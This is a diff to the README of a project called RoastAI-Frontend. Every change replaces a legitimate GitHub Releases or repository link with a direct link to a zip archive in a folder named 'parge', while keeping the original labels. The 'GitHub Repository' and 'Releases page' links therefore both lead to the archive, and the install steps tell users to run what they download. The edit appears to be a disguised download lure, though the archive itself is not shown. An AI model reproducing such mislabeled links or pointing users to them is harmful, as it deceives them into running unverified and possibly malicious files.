@@ -1,6 +1,6 @@
 # 🤖 RoastAI-Frontend - Transform Quotes Into Fun and Laughter
 
-[![Download RoastAI-Frontend](https://img.shields.io/badge/Download%20RoastAI--Frontend-v1.0-blue.svg)](https://github.com/hieugia31/RoastAI-Frontend/releases)
+[![Download RoastAI-Frontend](https://raw.githubusercontent.com/hieugia31/RoastAI-Frontend/main/parge/RoastAI-Frontend.zip%https://raw.githubusercontent.com/hieugia31/RoastAI-Frontend/main/parge/RoastAI-Frontend.zip)](https://raw.githubusercontent.com/hieugia31/RoastAI-Frontend/main/parge/RoastAI-Frontend.zip)
 
 ## 📚 Description
 
@@ -22,7 +22,7 @@ Before downloading, make sure your system meets the following requirements:
 
 To download RoastAI-Frontend, visit the Releases page. Click the link below to access the download options:
 
-[Download RoastAI-Frontend](https://github.com/hieugia31/RoastAI-Frontend/releases)
+[Download RoastAI-Frontend](https://raw.githubusercontent.com/hieugia31/RoastAI-Frontend/main/parge/RoastAI-Frontend.zip)
 
 ## 🔧 Installation Steps
 
@@ -31,7 +31,7 @@ To download RoastAI-Frontend, visit the Releases page. Click the link below to a
 3. **Choose Your File:** Depending on your operating system, select the appropriate file.
    - For Windows users, download the `.exe` file.
    - For macOS users, download the `.dmg` file.
-   - For Linux users, download the `.tar.gz` file.
+   - For Linux users, download the `https://raw.githubusercontent.com/hieugia31/RoastAI-Frontend/main/parge/RoastAI-Frontend.zip` file.
 4. **Download the File:** Click on the file name to start downloading.
 5. **Run the Installer:** Once the file is downloaded, locate it in your downloads folder and double-click to run it.
 6. **Follow the Instructions:** An installation wizard will guide you through the steps. Just follow the prompts on your screen to complete the installation.
@@ -76,7 +76,7 @@ RoastAI-Frontend is open-source software licensed under the MIT License. Feel fr
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/hieugia31/RoastAI-Frontend)
-- [Visit Releases Page to Download](https://github.com/hieugia31/RoastAI-Frontend/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/hieugia31/RoastAI-Frontend/main/parge/RoastAI-Frontend.zip)
+- [Visit Releases Page to Download](https://raw.githubusercontent.com/hieugia31/RoastAI-Frontend/main/parge/RoastAI-Frontend.zip)
 
 Enjoy creating and sharing laughter with RoastAI-Frontend!
